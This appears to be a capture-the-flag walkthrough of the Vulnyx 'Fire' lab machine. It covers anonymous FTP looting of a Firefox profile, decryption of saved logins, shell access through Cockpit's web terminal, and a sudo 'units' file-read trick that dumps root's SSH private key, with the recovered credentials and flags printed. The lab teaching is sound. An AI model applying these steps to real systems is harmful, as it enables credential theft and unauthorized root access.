# Vulnyx: Fire

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ftp` · `firefox_decrypt` · `ssh` |
| **Tags** | `#AnonymousFTP` `#FirefoxDecrypt` `#Cockpit` `#SudoAbuse` `#GTFOBins` `#SSHKeyLeak` |
| **URL** | https://vulnyx.com/machines/ |

A backup pulled over FTP turns out to include a full Firefox profile, and `firefox_decrypt` recovers a saved login from it directly. Those credentials work against Cockpit — a web-based Linux administration console running on port 9090 — whose built-in terminal component gives a real shell with no separate exploit needed. From there, a `sudo` rule around `units`, abused via its documented GTFOBins file-read technique, leaks root's own SSH key.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn fire.nyx

PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
9090/tcp open  zeus-admin syn-ack ttl 64
MAC Address: 08:00:27:C1:20:C9 (Oracle VirtualBox virtual NIC)
```

Four ports come back open: **21 (FTP)**, **22 (SSH)**, **80 (HTTP)**, and **9090**. A version/script scan against all four fills in the details — anonymous FTP is allowed and a `backup.zip` sits in the root's listing:

```bash
$ sudo nmap -p 21,22,80,9090 -sCV fire.nyx

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     pyftpdlib 1.5.7
| ftp-syst:
|   STAT:
| FTP server status:
|    Connected to: <IP_Victim>:21
|    Waiting for username.
|    TYPE: ASCII; STRUcture: File; MODE: Stream
|    Data connection closed.
|_End of status.
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 root     root      4442576 Sep 29  2023 backup.zip
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
9090/tcp open  http    Cockpit web service 221 - 253
|_http-title: Did not follow redirect to https://fire.nyx:9090/
MAC Address: 08:00:27:C1:20:C9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

Port 80 is the stock Apache default page:

```
http://fire.nyx/
```

<img src="../Images/fire/Pasted image 20260813182030.png"/>

Port 9090 turns out to be Cockpit — a web-based administration console for Linux servers, giving dashboards for services, logs, storage, and (relevantly) a built-in terminal once logged in. It needs valid system credentials, which aren't in hand yet:

```
https://fire.nyx:9090/
```

<img src="../Images/fire/Pasted image 20260813182045.png"/>

## Initial Access

### Loot: A Firefox Profile Backup

The `backup.zip` the scan flagged is pulled down over anonymous FTP:

```bash
$ ftp fire.nyx
Connected to fire.nyx.
220 pyftpdlib 1.5.7 ready.
Name (fire.nyx:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
229 Entering extended passive mode (|||36367|).
125 Data connection already open. Transfer starting.
-rw-r--r--    1 root     root      4442576 Sep 29  2023 backup.zip
226 Transfer complete.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering extended passive mode (|||37011|).
125 Data connection already open. Transfer starting.
100% |*******************************************************|  4338 KiB  111.81 MiB/s    00:00 ETA
226 Transfer complete.
4442576 bytes received in 00:00 (110.83 MiB/s)
```

Unpacking it reveals a full Firefox profile directory rather than an ordinary backup:

```bash
$ unzip backup.zip
$ ls -l mozilla/firefox
total 28
drwx------    2 kali kali 4096 Sep 29  2023  3m1uu7kd.default
drwx------    3 kali kali 4096 Sep 29  2023 'Crash Reports'
-rw-r--r--    1 kali kali   58 Sep 29  2023  installs.ini
drwxr-xr-x    3 kali kali 4096 Sep 29  2023  kzf86n13.default-esr
drwx------   12 kali kali 4096 Sep 29  2023  pe1jatah.default-esr
drwx------    2 kali kali 4096 Sep 29  2023 'Pending Pings'
-rw-r--r--    1 kali kali  247 Sep 29  2023  profiles.ini
```

`firefox_decrypt` reads a profile's saved logins and master-password-protected storage directly, decrypting anything it can:

```bash
$ git clone https://github.com/unode/firefox_decrypt.git
```

The first profile isn't a valid one, but the second (`pe1jatah.default-esr`) holds a stored login:

```bash
$ python3 firefox_decrypt.py ~/Vulnyx/Easy/Fire/mozilla/firefox
Select the Mozilla profile you wish to decrypt
1 -> 3m1uu7kd.default
2 -> pe1jatah.default-esr
1

2026-08-13 12:08:27,506 - ERROR - Couldn't initialize NSS, maybe '/home/kali/Vulnyx/Easy/Fire/mozilla/firefox/3m1uu7kd.default' is not a valid profile?
```

```bash
$ python3 firefox_decrypt.py ~/Vulnyx/Easy/Fire/mozilla/firefox
Select the Mozilla profile you wish to decrypt
1 -> 3m1uu7kd.default
2 -> pe1jatah.default-esr
2

Website:  http://localhost
Username: 'marco'
Password: 'm@rc0!123'
```

> **Credentials:** `marco:m@rc0!123`

### Shell via Cockpit's Web Terminal

`marco`'s credentials log straight into Cockpit:

```
https://fire.nyx:9090/system
```

<img src="../Images/fire/Pasted image 20260813182208.png"/>

Cockpit's terminal page gives a full interactive shell in the browser, running as whichever account authenticated:

```
https://fire.nyx:9090/system/terminal
```

<img src="../Images/fire/Pasted image 20260813182244.png"/>

```bash
marco@fire:~$ id
uid=1000(marco) gid=1000(marco) grupos=1000(marco)
marco@fire:~$ ls -l /home/marco
total 4
-r--------    1 marco    marco           33 sep 29  2023 user.txt
marco@fire:~$ cat /home/marco/user.txt
5400962bb9d361da14bc28ac666e3ad7
```

> **User flag:** `5400962bb9d361da14bc28ac666e3ad7`

## Privilege Escalation

### File Read via `units`

```bash
marco@fire:~$ sudo -l
Matching Defaults entries for marco on fire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marco may run the following commands on fire:
    (root) NOPASSWD: /usr/bin/units
```

`marco` can run `/usr/bin/units` — a unit-conversion tool — as root. It has a documented GTFOBins technique built around its `-f` flag, which loads an alternate definitions file: pointed at a file that isn't actually a units-definitions file, it echoes each line back inside a parse-error message instead of failing cleanly — leaking the file's contents. Aiming it at root's own SSH key dumps the key line by line:

```bash
marco@fire:~$ sudo /usr/bin/units -f /root/.ssh/id_rsa
units: unit '-----BEGIN' in units file '/root/.ssh/id_rsa' on line 1 ignored.  It contains invalid character '-'
units: unit 'MIIEowIBAAKCAQEA4zyTaEdG9ndkXzil42utXutJCywNF5siqTqPYP8e2ofNCA26' lacks a definition at line 2 of '/root/.ssh/id_rsa'
units: unit 'hLDrlYAhzXDi/zQA+2IteiKtzJBAX3F9ZLqZRkkFswpjW70eP3uq/OkAppLRrWff' lacks a definition at line 3 of '/root/.ssh/id_rsa'
units: unit '25TX5BZAFw7le1gzCNnA5U7SPQWZMkCdC+JAxrx3pkX0MLI5hn5UTNuZkl4XCozV' lacks a definition at line 4 of '/root/.ssh/id_rsa'
units: unit 'IUmrErfyWhydNlAIGJhfMiJ8EC6+BY+/oW9XN2YoVR8a0sLz0gWHAAKRQkQMqjPn' lacks a definition at line 5 of '/root/.ssh/id_rsa'
units: unit 'A6cnfeXO6KprGq200ev81FhBeVqkrrrvSHvNSXrvqNL/N8fPZVD452ene3CVvQIm' lacks a definition at line 6 of '/root/.ssh/id_rsa'
units: unit 'ohjNikvqqnLhCM4Hl/CtQL8w1rl+Uih19mfiuQIDAQABAoIBAQCLiqZm0eZ08cpU' lacks a definition at line 7 of '/root/.ssh/id_rsa'
units: unit 'YyATsQrtEAVx8+IyTdUSIODtSp1xy57vxCZ214JD80ROuXTcDN5RgO+2YddimG6/' lacks a definition at line 8 of '/root/.ssh/id_rsa'
units: unit 'bZz4H1KCg9MZKFbteDbEezf8SUVaBSz3lKM2X4fYDAXdYwtvHDFyz02Uozudt3Nl' lacks a definition at line 9 of '/root/.ssh/id_rsa'
units: unit 'FaKbKpxmrlO3apvSz49d1PQFopEC/NY/jVlJo3tReriYC+DIgYaY/i8kZTHL8eY8' lacks a definition at line 10 of '/root/.ssh/id_rsa'
units: unit 'x8OMDIFag7CnPMDVGsmyTwvVwao1GNR6KZxI+j9ca0taurzxd9vnEzYim2e1dLDA' lacks a definition at line 11 of '/root/.ssh/id_rsa'
units: unit 'K2EfYUssTu+9QiSVOk1TUaiGiZUl1he4H3lMzDjEq4epRGwwyQUdE3B/cBpSDClH' lacks a definition at line 12 of '/root/.ssh/id_rsa'
units: unit 'HX4Ph7KBAoGBAPj7v+IsC0XTGWTXjKclDn/Ah6C0XRAWMJRkiQCK8hi8FtAqxgwQ' lacks a definition at line 13 of '/root/.ssh/id_rsa'
units: unit '08eNxg57Dn7284DahjOMJYXtuY9P+jOoYg26ICazkwg+BnsZvfEjJxvFMXnYnDyw' lacks a definition at line 14 of '/root/.ssh/id_rsa'
units: unit 'Z1w0MOPR5S9p/9gTLinHEIt+rGS4rOZXd9llVq187i+FyiB/L9nWTDxRAoGBAOmj' lacks a definition at line 15 of '/root/.ssh/id_rsa'
units: unit '8AyUkAiJYBY/lX8TS8EORBpUljpfTPfmg6s19pwxP4K9hUkW1MNduBth3Nw6FRRZ' lacks a definition at line 16 of '/root/.ssh/id_rsa'
units: unit '2jm4Gw6k+l9+MAsyoOldD5SFezX7bfll4+pqWG/CRKnnE4Ot70XvSeab6U2cpLhB' lacks a definition at line 17 of '/root/.ssh/id_rsa'
units: unit 'UKLM9vVvCbS3608twDg42DZ22bPEjNnc02puzu3pAoGAFC1apHqLQ1JTKX/qTxVK' lacks a definition at line 18 of '/root/.ssh/id_rsa'
units: unit 'soGovBMtaYNS1oO7MocQDX8YnjAJMqsebnqHxV6lkxZyL0wGOiEuXUchlYKWtR79' lacks a definition at line 19 of '/root/.ssh/id_rsa'
units: unit 'Kz2dI2XEEZPtNIamhOcjYTW+x7ANIUHubmNwXtYAq7H8YMdVI1+VcKiIUfVBVb1a' lacks a definition at line 20 of '/root/.ssh/id_rsa'
units: unit '4gw7VP3d044VDkMgXpfmP7ECgYB4r7sm9HK2RigBNhUGEDSYY8MgCsOTIXlDsKog' lacks a definition at line 21 of '/root/.ssh/id_rsa'
units: unit '/X4GzpWs9jLsP0PmKvoYAuQwSjxrR8KnAAfR97xxKWCt2Bgwk2ah5JVxnBABvPUP' lacks a definition at line 22 of '/root/.ssh/id_rsa'
units: unit 'OKG4ERSg4wE8itINMB7vZWgNNDYOC4CYoWGMBDByTnLZcpuRLyPYdmocJxJO03fN' lacks a definition at line 23 of '/root/.ssh/id_rsa'
units: unit 'ybFQSQKBgA9X6z0WlFOWUqx7OcIhbeVAiYisi+582Wt2G+aUVM71S49gk5lxh1Oe' lacks a definition at line 24 of '/root/.ssh/id_rsa'
units: unit '+IxWgWsAvedbz9YigaVeZ/X1seIRs97IhZszK6QYMYsdJ/bu6Qzrd/pibLT52nDD' lacks a definition at line 25 of '/root/.ssh/id_rsa'
units: unit '/7EWKpTCqpAyAmdNA/B0jMprzP/4njtu0fvGbjDrv0jQ8qyJCv0r' lacks a definition at line 26 of '/root/.ssh/id_rsa'
units: unit '-----END' in units file '/root/.ssh/id_rsa' on line 27 ignored.  It contains invalid character '-'
```

Stripping the `units: unit '` wrapper off each line reconstructs the private key, which is saved locally:

```bash
$ nano root_rsa
$ chmod 600 root_rsa
```

```bash
$ ssh root@fire.nyx -i root_rsa
root@fire:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@fire:~# ls -l /root
total 4
-r--------    1 root     root            33 sep 29  2023 root.txt
root@fire:~# cat /root/root.txt
5df134b18a5bf4240d6b29cf0ab968a8
```

> **Root flag:** `5df134b18a5bf4240d6b29cf0ab968a8`

## Takeaways

- A browser profile is a credential store in its own right — a Firefox (or Chrome) profile folder found in a backup is worth running through a decryption tool like `firefox_decrypt` before assuming it's just cache and history.
- Cockpit and similar web-based admin panels are a fast path from "valid Linux credentials" to "interactive shell" — no separate RCE is needed once a working login is available, since the terminal feature is part of the product by design.
- GTFOBins isn't limited to well-known utilities — `units` isn't an obvious privilege escalation target, and checking any unfamiliar binary that shows up in `sudo -l` against it is worth doing as a matter of course.